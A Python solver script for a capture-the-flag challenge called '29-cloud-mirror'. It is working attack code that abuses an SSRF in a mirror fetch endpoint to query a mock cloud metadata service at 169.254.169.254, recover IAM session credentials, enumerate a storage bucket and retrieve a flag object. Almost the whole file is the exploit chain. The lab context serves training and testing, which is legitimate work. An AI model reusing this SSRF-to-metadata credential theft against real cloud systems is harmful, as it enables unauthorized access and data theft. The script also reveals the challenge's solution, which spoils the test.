#!/usr/bin/env python3
"""
Automated Participant-Side Solver for 29-cloud-mirror
Exploits SSRF in the asset mirror endpoint on port 8089 to pivot to mock cloud metadata (169.254.169.254),
recovers IAM session credentials, accesses the private object storage bucket, and extracts the orbital defense flag.
"""

import sys
import re
import json
import argparse
import urllib.request
import urllib.error

def fetch_via_ssrf(base_url: str, target_url: str, custom_headers: dict = None) -> dict:
    fetch_endpoint = f"{base_url.rstrip('/')}/api/v1/fetch"
    payload = {
        "url": target_url,
        "headers": custom_headers or {}
    }
    req = urllib.request.Request(
        fetch_endpoint,
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read().decode("utf-8"))

def solve(base_url: str = "http://127.0.0.1:8089") -> str:
    base_url = base_url.rstrip("/")
    print("=" * 65)
    print(" [*] 29-cloud-mirror Automated Solver")
    print(f" [*] Target Base URL: {base_url}")
    print("=" * 65)

    # Step 1: Health check
    print("\n[Step 1] Verifying Cloud Mirror Gateway...")
    health_req = urllib.request.Request(f"{base_url}/api/v1/health")
    with urllib.request.urlopen(health_req, timeout=5) as resp:
        health_data = json.loads(resp.read().decode("utf-8"))
    print(f"[+] Gateway status: {health_data}")

    # Step 2: Query Mock Metadata Service via SSRF
    metadata_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/LatveriaCloudMirrorRole"
    print(f"\n[Step 2] Querying Mock Metadata Service at {metadata_url} via SSRF...")
    meta_result = fetch_via_ssrf(base_url, metadata_url)

    if meta_result.get("http_status") != 200 or not meta_result.get("json_data"):
        raise ValueError(f"Failed to retrieve metadata credentials: {meta_result}")

    creds = meta_result["json_data"]
    token = creds.get("Token")
    access_key = creds.get("AccessKeyId")
    storage_info = creds.get("StorageService", {})
    storage_endpoint = storage_info.get("InternalDNS", "http://storage.internal/api/v1/storage")

    print(f"[+] Recovered temporary cloud credentials:")
    print(f"    Role ARN:       {creds.get('RoleArn')}")
    print(f"    AccessKeyId:    {access_key}")
    print(f"    SessionToken:   {token}")
    print(f"    Storage Target: {storage_endpoint}")

    if not token:
        raise ValueError("No session token found in metadata response!")

    # Step 3: List Storage Buckets
    buckets_url = f"{storage_endpoint}/buckets"
    print(f"\n[Step 3] Enumerating Mock Object Storage Buckets at {buckets_url}...")
    auth_headers = {"Authorization": f"Bearer {token}"}
    buckets_result = fetch_via_ssrf(base_url, buckets_url, auth_headers)

    if buckets_result.get("http_status") != 200 or not buckets_result.get("json_data"):
        raise ValueError(f"Failed to list storage buckets: {buckets_result}")

    buckets_data = buckets_result["json_data"]
    buckets = [b["name"] for b in buckets_data.get("buckets", [])]
    print(f"[+] Discovered storage buckets: {buckets}")

    target_bucket = "classified-orbital-mirror"
    if target_bucket not in buckets:
        raise ValueError(f"Target bucket '{target_bucket}' not found in bucket list: {buckets}")

    # Step 4: List Objects in Target Bucket
    objects_url = f"{storage_endpoint}/{target_bucket}"
    print(f"\n[Step 4] Listing objects in bucket '{target_bucket}' at {objects_url}...")
    objects_result = fetch_via_ssrf(base_url, objects_url, auth_headers)

    if objects_result.get("http_status") != 200 or not objects_result.get("json_data"):
        raise ValueError(f"Failed to list objects in '{target_bucket}': {objects_result}")

    objects_data = objects_result["json_data"]
    objects = [o["key"] for o in objects_data.get("objects", [])]
    print(f"[+] Objects found in '{target_bucket}': {objects}")

    target_key = "classified_mirror_master_key.dat"
    if target_key not in objects:
        raise ValueError(f"Target object '{target_key}' not found in objects list: {objects}")

    # Step 5: Fetch Flag Object
    secret_object_url = f"{storage_endpoint}/{target_bucket}/{target_key}"
    print(f"\n[Step 5] Retrieving secret object from {secret_object_url}...")
    secret_result = fetch_via_ssrf(base_url, secret_object_url, auth_headers)

    if secret_result.get("http_status") != 200:
        raise ValueError(f"Failed to retrieve target object: {secret_result}")

    secret_data = secret_result.get("json_data", {})
    flag = secret_data.get("flag")
    if not flag:
        body_str = secret_result.get("body", "")
        flag_match = re.search(r"(YUVA\{[^\}]+\}|DOOM\{[^\}]+\}|FLAG\{[^\}]+\})", body_str)
        if flag_match:
            flag = flag_match.group(1)

    if not flag:
        raise ValueError(f"Flag not found in secret data: {secret_data}")

    flag_match = re.search(r"(YUVA\{[^\}]+\}|DOOM\{[^\}]+\}|FLAG\{[^\}]+\})", flag)
    if flag_match:
        flag = flag_match.group(1)

    print("\n" + "=" * 65)
    print(f"[SUCCESS] Flag Retrieved: {flag}")
    print("=" * 65 + "\n")
    return flag

def main():
    parser = argparse.ArgumentParser(description="29-cloud-mirror Solver")
    parser.add_argument("--url", default="http://127.0.0.1:8089", help="Target base URL (default: http://127.0.0.1:8089)")
    args = parser.parse_args()
    solve(args.url)

if __name__ == "__main__":
    main()
